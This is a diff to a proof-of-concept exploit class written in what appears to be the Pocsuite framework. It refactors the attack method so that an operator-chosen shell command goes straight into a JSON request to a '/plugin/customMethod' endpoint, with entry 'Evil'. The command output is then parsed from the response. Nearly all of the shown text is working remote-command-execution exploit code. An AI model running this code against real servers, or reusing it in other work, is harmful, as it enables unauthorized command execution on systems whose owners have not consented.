@@ -53,20 +53,13 @@ class DemoPOC(POCBase):
                 result['VerifyInfo']['Response'] = re.findall(r'{"data":(.*?)"success',resp.text)[0]
         except Exception as ex:
             pass
-
-        return self.parse_output(result)
-
-    def _attack(self):
-        cmd = self.get_option("command")
-        result = dict()
-        result['Stdout'] = self._exploit(cmd)
-
+        
         return self.parse_output(result)
     
-    def _exploit(self, cmd='id'):
+    def _attack(self):
         result = {}
         url = self.url.rstrip('/') + "/plugin/customMethod"
-        data = '{"entry":"Evil","request":"' + cmd + '"}'
+        data = '{"entry":"Evil","request":"' + self.get_option("command") + '"}'
         headers = {
             "Content-Type": "application/json"
         }
@@ -75,7 +68,7 @@ class DemoPOC(POCBase):
             if 'success' in resp.text and resp.status_code == 200:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = url
-                result['VerifyInfo']['Cmd'] = cmd
+                result['VerifyInfo']['Cmd'] = self.get_option("command")
                 result['VerifyInfo']['Response'] = re.findall(r'{"data":(.*?)"success',resp.text)[0]
         except Exception as ex:
             pass
@@ -93,8 +86,6 @@ class DemoPOC(POCBase):
         else:
             output.fail('target is not vulnerable')
         return output
-
-    _attack = _verify
 
 
 register_poc(DemoPOC)
